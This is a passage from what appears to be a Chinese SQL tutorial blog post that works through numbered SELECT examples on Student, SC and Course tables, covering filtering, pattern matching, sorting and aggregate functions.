<p><strong>[例15] 删除Student表的Stusname索引</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> INDEX Stusno <span class="keyword">ON</span> Student;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>等价</span><br><span class="line"><span class="keyword">DROP</span> INDEX Student.Stusno;</span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20210329234958.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<hr>
<h1 id="思维导图-1"><a href="#思维导图-1" class="headerlink" title="思维导图"></a>思维导图</h1><p><img src="https://img.npfs06.top/20210330000240.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h1 id="Student-SC-Course表数据及结构"><a href="#Student-SC-Course表数据及结构" class="headerlink" title="Student/SC/Course表数据及结构"></a>Student/SC/Course表数据及结构</h1><ul>
<li>本篇文章都是围绕这三个表展开的。<br><img src="https://img.npfs06.top/20210330000302.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></li>
</ul>
<h1 id="SELECT语句的一般格式"><a href="#SELECT语句的一般格式" class="headerlink" title="SELECT语句的一般格式"></a>SELECT语句的一般格式</h1><p>先从整体上了解一下SELECT的格式，关键字的位置。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> [<span class="keyword">ALL</span><span class="operator">|</span><span class="keyword">DISTINCT</span>]   </span><br><span class="line"><span class="operator">&lt;</span>目标列表达式<span class="operator">&gt;</span> [别名] [ ，<span class="operator">&lt;</span>目标列表达式<span class="operator">&gt;</span> [别名]] … </span><br><span class="line"><span class="keyword">FROM</span>   <span class="operator">&lt;</span>表名或视图名<span class="operator">&gt;</span> [别名]   [ ，<span class="operator">&lt;</span>表名或视图名<span class="operator">&gt;</span> [别名]] …</span><br><span class="line">[<span class="keyword">WHERE</span> <span class="operator">&lt;</span>条件表达式<span class="operator">&gt;</span>]</span><br><span class="line">[<span class="keyword">GROUP</span>  <span class="keyword">BY</span><span class="operator">&lt;</span>列名<span class="number">1</span><span class="operator">&gt;</span></span><br><span class="line">[<span class="keyword">HAVING</span>  <span class="operator">&lt;</span>条件表达式<span class="operator">&gt;</span>]]</span><br><span class="line">[<span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="operator">&lt;</span>列名<span class="number">2</span><span class="operator">&gt;</span> [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>] </span><br></pre></td></tr></table></figure>
<h1 id="单表查询"><a href="#单表查询" class="headerlink" title="单表查询"></a>单表查询</h1><h2 id="选择表中的若干列"><a href="#选择表中的若干列" class="headerlink" title="选择表中的若干列"></a>选择表中的若干列</h2><h3 id="查询指定列"><a href="#查询指定列" class="headerlink" title="查询指定列"></a>查询指定列</h3><ul>
<li><code>查询指定列</code></li>
</ul>
<p><strong>[例1] 查询全体学生的学号与姓名。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sno,Sname </span><br><span class="line"><span class="keyword">FROM</span> Student;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.npfs06.top/20210330000313.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><strong>[例2] 查询全体学生的姓名、学号、所在系。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,Sno,Sdept </span><br><span class="line"><span class="keyword">FROM</span> Student;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.npfs06.top/20210330000324.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h3 id="查询全部列"><a href="#查询全部列" class="headerlink" title="查询全部列"></a>查询全部列</h3><ul>
<li>选出所有属性列：在SELECT关键字后面列出所有列名 ，将&lt;目标列表达式&gt;指定为 *</li>
</ul>
<p><strong>[例3] 查询全体学生的详细记录。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>  Sno,Sname,Ssex,Sage,Sdept </span><br><span class="line"><span class="keyword">FROM</span> Student;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>两种方式</span><br><span class="line"><span class="keyword">SELECT</span>  <span class="operator">*</span><span class="keyword">FROM</span> Student;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.npfs06.top/20210330000334.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h3 id="查询经过计算的值"><a href="#查询经过计算的值" class="headerlink" title="查询经过计算的值"></a>查询经过计算的值</h3><ul>
<li><code>SELECT子句的&lt;目标列表达式&gt;可以为：</code><br>算术表达式<br>字符串常量<br>函数<br>列别名</li>
</ul>
<h4 id="算术表达式"><a href="#算术表达式" class="headerlink" title="算术表达式"></a>算术表达式</h4><p><strong>[例4] 查全体学生的姓名及其出生年份。这里假定目前年份是2004年。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,<span class="number">2004</span><span class="operator">-</span>Sage </span><br><span class="line"><span class="keyword">FROM</span> Student;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.npfs06.top/20210330000344.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h4 id="字符串常量及函数"><a href="#字符串常量及函数" class="headerlink" title="字符串常量及函数"></a>字符串常量及函数</h4><p><strong>[例5] 查询全体学生的姓名、出生年份和所有系，要求用小写字母表示所有系名，这里假定目前年份是2004年。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,<span class="string">&#x27;Year of Birth: &#x27;</span>, <span class="number">2004</span><span class="operator">-</span>Sage, <span class="built_in">LOWER</span>(Sdept)</span><br><span class="line"><span class="keyword">FROM</span> Student;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.npfs06.top/20210330000356.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h4 id="使用列别名改变查询结果的列标题"><a href="#使用列别名改变查询结果的列标题" class="headerlink" title="使用列别名改变查询结果的列标题"></a>使用列别名改变查询结果的列标题</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname NAME,<span class="string">&#x27;Year of Birth: &#x27;</span>  BIRTH,</span><br><span class="line"><span class="number">2000</span><span class="operator">-</span>Sage  BIRTHDAY,</span><br><span class="line"><span class="built_in">LOWER</span>(Sdept)  DEPARTMENT</span><br><span class="line"><span class="keyword">FROM</span> Student;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.npfs06.top/20210330000406.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="选择表中的若干元组（行）"><a href="#选择表中的若干元组（行）" class="headerlink" title="选择表中的若干元组（行）"></a>选择表中的若干元组（行）</h2><h3 id="键词DISTINCT去掉表中重复的行"><a href="#键词DISTINCT去掉表中重复的行" class="headerlink" title="键词DISTINCT去掉表中重复的行"></a>键词DISTINCT去掉表中重复的行</h3><ul>
<li>如果没有指定DISTINCT关键词，则缺省为ALL</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sno <span class="keyword">FROM</span> SC;</span><br><span class="line"><span class="comment">/*等价于：*/</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">ALL</span>  Sno  <span class="keyword">FROM</span> SC;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.npfs06.top/20210330000415.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><br><strong>[例6] 查询选修了课程的学生学号。指定<code>DISTINCT</code>关键词，去掉表中重复的行</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> Sno</span><br><span class="line"><span class="keyword">FROM</span> SC;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.npfs06.top/20210330000426.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h3 id="查询满足条件的元组（行）"><a href="#查询满足条件的元组（行）" class="headerlink" title="查询满足条件的元组（行）"></a>查询满足条件的元组（行）</h3><ul>
<li>常用的查询条件</li>
</ul>
<table>
<thead>
<tr>
<th>查询条件</th>
<th>谓词</th>
</tr>
</thead>
<tbody><tr>
<td>比较</td>
<td>=，&gt;，&lt;，&gt;=，&lt;=，!=，&lt;&gt;，!&gt;，!&lt;；NOT+上述比较运算符</td>
</tr>
<tr>
<td>确定范围</td>
<td>BETWEEN AND，NOT BETWEEN AND</td>
</tr>
<tr>
<td>确定集合</td>
<td>IN，NOT IN</td>
</tr>
<tr>
<td>字符匹配</td>
<td>LIKE，NOT LIKE</td>
</tr>
<tr>
<td>空值</td>
<td>IS NULL，IS NOT NULL</td>
</tr>
<tr>
<td>多重条件（逻辑运算）</td>
<td>AND，OR，NOT</td>
</tr>
</tbody></table>
<h4 id="比较大小"><a href="#比较大小" class="headerlink" title="比较大小"></a>比较大小</h4><p><strong>[例7]查询计算机科学系全体学生的名单。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept<span class="operator">=</span><span class="string">&#x27;CS&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.npfs06.top/20210330000437.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><br><strong>[例8] 查询所有年龄在20岁以下的学生姓名及其年龄。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,Sage </span><br><span class="line"><span class="keyword">FROM</span> Student </span><br><span class="line"><span class="keyword">WHERE</span> Sage <span class="operator">&lt;</span> <span class="number">20</span>;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.npfs06.top/20210330000447.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><br><strong>[例9]查询考试成绩有不及格的学生的学号。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> Sno</span><br><span class="line"><span class="keyword">FROM</span>  SC</span><br><span class="line"><span class="keyword">WHERE</span> Grade<span class="operator">&lt;</span><span class="number">60</span>;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.npfs06.top/20210330000457.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h4 id="确定范围"><a href="#确定范围" class="headerlink" title="确定范围"></a>确定范围</h4><p><strong>谓词:</strong></p>
<ul>
<li><code>BETWEEN … AND …</code></li>
<li><code>NOT BETWEEN … AND …</code></li>
</ul>
<p><strong>[例10] 查询年龄在20~23岁（包括20岁和23岁）之间的学生的</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,Sdept,Sage</span><br><span class="line"><span class="keyword">FROM</span>  Student</span><br><span class="line"><span class="keyword">WHERE</span> Sage </span><br><span class="line"><span class="keyword">BETWEEN</span> <span class="number">20</span> <span class="keyword">AND</span> <span class="number">23</span>; </span><br></pre></td></tr></table></figure>
<p><img src="http://img.npfs06.top/20210330000515.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><br><strong>[例11] 查询年龄不在20~23岁之间的学生姓名、系别和年龄</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,Sdept,Sage</span><br><span class="line"><span class="keyword">FROM</span>  Student</span><br><span class="line"><span class="keyword">WHERE</span> Sage <span class="keyword">NOT</span> <span class="keyword">BETWEEN</span> <span class="number">20</span> <span class="keyword">AND</span> <span class="number">23</span>;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.npfs06.top/20210330000525.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h4 id="确定集合"><a href="#确定集合" class="headerlink" title="确定集合"></a>确定集合</h4><p><strong>谓词：</strong></p>
<ul>
<li><code>IN &lt;值表&gt;,</code></li>
<li><code>NOT IN &lt;值表&gt;</code></li>
</ul>
<p><strong>[例12]查询信息系（IS）、数学系（MA）和计算机科学系（CS）学生的姓名和性别。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,Ssex</span><br><span class="line"><span class="keyword">FROM</span>  Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept <span class="keyword">IN</span> ( <span class="string">&#x27;IS&#x27;</span>,<span class="string">&#x27;MA&#x27;</span>,<span class="string">&#x27;CS&#x27;</span> );</span><br></pre></td></tr></table></figure>
<p><img src="http://img.npfs06.top/20210330000534.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><br><strong>[例13]查询既不是信息系、数学系，也不是计算机科学系的学生的姓名和性别。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,Ssex</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept <span class="keyword">NOT</span> <span class="keyword">IN</span> ( <span class="string">&#x27;IS&#x27;</span>,<span class="string">&#x27;MA&#x27;</span>,<span class="string">&#x27;CS&#x27;</span> );</span><br></pre></td></tr></table></figure>
<p><img src="http://img.npfs06.top/20210330000545.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h4 id="字符匹配"><a href="#字符匹配" class="headerlink" title="字符匹配"></a>字符匹配</h4><p><strong>谓词：</strong></p>
<ul>
<li><code>[NOT] LIKE ‘&lt;匹配串&gt;’ [ESCAPE ‘ &lt;换码字符&gt;’]</code></li>
</ul>
<p><strong><code>匹配串为固定字符串</code></strong><br><strong>[例14] 查询学号为201215121的学生的详细情况。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span>    </span><br><span class="line"><span class="keyword">FROM</span>  Student  </span><br><span class="line"><span class="keyword">WHERE</span>  Sno <span class="keyword">LIKE</span> <span class="string">&#x27;201215121&#x27;</span>;</span><br><span class="line"><span class="comment">/*等价于：*/</span> </span><br><span class="line"><span class="keyword">SELECT</span>  <span class="operator">*</span> </span><br><span class="line"><span class="keyword">FROM</span>  Student </span><br><span class="line"><span class="keyword">WHERE</span> Sno <span class="operator">=</span> <span class="string">&#x27;201215121&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.npfs06.top/20210330000600.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><strong><code>匹配串为含通配符的字符串</code></strong><br><strong>[例15] 查询所有姓刘学生的姓名、学号和性别。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,Sno,Ssex</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span>  Sname <span class="keyword">LIKE</span> <span class="string">&#x27;刘%&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.npfs06.top/20210330000609.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><br><strong>[例16] 查询姓”欧阳”且全名为三个汉字的学生的姓名。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname</span><br><span class="line"><span class="keyword">FROM</span>   Student</span><br><span class="line"><span class="keyword">WHERE</span>  Sname <span class="keyword">LIKE</span> <span class="string">&#x27;欧阳_&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.npfs06.top/20210330000621.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><strong>[例17] 查询名字中第2个字为”阳”字的学生的姓名和学号。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,Sno</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sname <span class="keyword">LIKE</span> <span class="string">&#x27;_阳%&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.npfs06.top/20210330000631.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><strong>[例18] 查询所有不姓刘的学生姓名。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,Sno,Ssex</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sname <span class="keyword">NOT</span> <span class="keyword">LIKE</span> <span class="string">&#x27;刘%&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.npfs06.top/20210330000642.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h4 id="使用换码字符’’将通配符转义为普通字符"><a href="#使用换码字符’’将通配符转义为普通字符" class="headerlink" title="使用换码字符’’将通配符转义为普通字符"></a>使用换码字符’’将通配符转义为普通字符</h4><ul>
<li><code>ESCAPE &#39;＼&#39; 表示“ ＼” 为换码字符</code></li>
</ul>
<p><strong>[例19] 查询DB_Design课程的课程号和学分。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Cno,Ccredit</span><br><span class="line"><span class="keyword">FROM</span> Course</span><br><span class="line"><span class="keyword">WHERE</span> Cname <span class="keyword">LIKE</span> <span class="string">&#x27;DB\_Design&#x27;</span> <span class="keyword">ESCAPE</span> <span class="string">&#x27;\&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.npfs06.top/20210330000654.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><strong>[例20] 查询以”DB_”开头，且倒数第3个字符为 i的课程的详细情况。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>  <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span>   Course</span><br><span class="line"><span class="keyword">WHERE</span>  Cname <span class="keyword">LIKE</span>  <span class="string">&#x27;DB\_%i_ _&#x27;</span> <span class="keyword">ESCAPE</span> <span class="string">&#x27;\&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.npfs06.top/20210330000704.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h4 id="涉及空值的查询"><a href="#涉及空值的查询" class="headerlink" title="涉及空值的查询"></a>涉及空值的查询</h4><p><strong>谓词：</strong></p>
<ul>
<li><code>IS NULL</code></li>
<li><code>IS NOT NULL</code></li>
<li><code>“IS” 不能用 “=” 代替</code></li>
</ul>
<p><strong>[例21] 某些学生选修课程后没有参加考试，所以有选课记录，但没有考试成绩。查询缺少成绩的学生的学号和相应的课程号。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sno,Cno</span><br><span class="line"><span class="keyword">FROM</span>  SC</span><br><span class="line"><span class="keyword">WHERE</span>  Grade <span class="keyword">IS</span> <span class="keyword">NULL</span>;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.npfs06.top/20210330000713.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><strong>[例22] 查所有有成绩的学生学号和课程号。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sno,Cno</span><br><span class="line"><span class="keyword">FROM</span>  SC</span><br><span class="line"><span class="keyword">WHERE</span>  Grade <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.npfs06.top/20210330000724.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h4 id="多重条件查询"><a href="#多重条件查询" class="headerlink" title="多重条件查询"></a>多重条件查询</h4><p><strong>逻辑运算符：</strong></p>
<ul>
<li>AND和 OR来联结多个查询条件</li>
<li>AND的优先级高于OR</li>
<li>可以用括号改变优先级</li>
</ul>
<p><strong>可用来实现多种其他谓词</strong></p>
<ul>
<li><code>[NOT] IN</code></li>
<li><code>[NOT] BETWEEN … AND …</code></li>
</ul>
<p><strong>[例23] 查询计算机系年龄在20岁以下的学生姓名。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname</span><br><span class="line"><span class="keyword">FROM</span>  Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept<span class="operator">=</span> <span class="string">&#x27;CS&#x27;</span> <span class="keyword">AND</span> Sage<span class="operator">&lt;</span><span class="number">20</span>;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.npfs06.top/20210330000734.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><strong>改写[例12] 查询信息系（IS）、数学系（MA）和计算机科学系（CS）学生的姓名和性别。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,Ssex</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept <span class="keyword">IN</span> ( <span class="string">&#x27;IS&#x27;</span>,<span class="string">&#x27;MA&#x27;</span>,<span class="string">&#x27;CS&#x27;</span> );</span><br><span class="line"><span class="comment">/*可改写为：*/</span></span><br><span class="line"><span class="keyword">SELECT</span> Sname,Ssex</span><br><span class="line"><span class="keyword">FROM</span>   Student</span><br><span class="line"><span class="keyword">WHERE</span>  Sdept<span class="operator">=</span> <span class="string">&#x27;IS&#x27;</span> <span class="keyword">OR</span> Sdept<span class="operator">=</span> <span class="string">&#x27;MA&#x27;</span> <span class="keyword">OR</span> Sdept<span class="operator">=</span> <span class="string">&#x27;CS&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328170055535.png" alt="在这里插入图片描述"></p>
<h2 id="ORDER-BY子句"><a href="#ORDER-BY子句" class="headerlink" title="ORDER BY子句"></a>ORDER BY子句</h2><p><strong>ORDER BY子句</strong></p>
<ul>
<li><code>可以按一个或多个属性列排序；</code></li>
<li><code>升序：ASC；</code></li>
<li><code>降序：DESC；</code></li>
<li><code>缺省值为升序；</code></li>
</ul>
<p><strong>当排序列含空值时</strong></p>
<ul>
<li><code>ASC</code>：排序列为空值的元组<code>最后显示</code></li>
<li><code>DESC</code>：排序列为空值的元组<code>最先显示</code></li>
</ul>
<p><strong>[例24] 查询选修了3号课程的学生的学号及其成绩，查询结果按分数降序排列。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sno,Grade</span><br><span class="line"><span class="keyword">FROM</span>  SC</span><br><span class="line"><span class="keyword">WHERE</span>  Cno<span class="operator">=</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> Grade <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328170501500.png" alt="在这里插入图片描述"><br><strong>[例25] 查询全体学生情况，查询结果按所在系的系号升序排列，同一系中的学生按年龄降序排列。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>  <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span>  Student</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> Sdept,Sage <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2020032817053075.png" alt="在这里插入图片描述"></p>
<h2 id="聚集函数"><a href="#聚集函数" class="headerlink" title="聚集函数"></a>聚集函数</h2><p><strong>聚集函数：</strong></p>
<ul>
<li>计数<br><code>COUNT（[DISTINCT|ALL] *）</code><br><code>COUNT（[DISTINCT|ALL] &lt;列名&gt;）</code></li>
<li>计算总和<br><code>SUM（[DISTINCT|ALL] &lt;列名&gt;）</code></li>
<li>计算平均值<br><code>AVG（[DISTINCT|ALL] &lt;列名&gt;）</code></li>
<li>最大最小值<br><code>MAX（[DISTINCT|ALL] &lt;列名&gt;）</code><br><code>MIN（[DISTINCT|ALL] &lt;列名&gt;）</code></li>
</ul>
<p><strong>[例26] 查询学生总人数。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>)</span><br><span class="line"><span class="keyword">FROM</span>  Student;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328170802782.png" alt="在这里插入图片描述"><br><strong>[例27] 查询选修了课程的学生人数。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="keyword">DISTINCT</span> Sno)</span><br><span class="line"><span class="keyword">FROM</span> SC;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328170847534.png" alt="在这里插入图片描述"><br><strong>[例28] 计算2号课程的学生平均成绩。</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">AVG</span>(Grade)</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">WHERE</span> Cno<span class="operator">=</span> <span class="string">&#x27;2&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200328171143778.png" alt="在这里插入图片描述"></p>
<p><strong>[例29] 查询选修2号课程的学生最高分数。</strong></p>
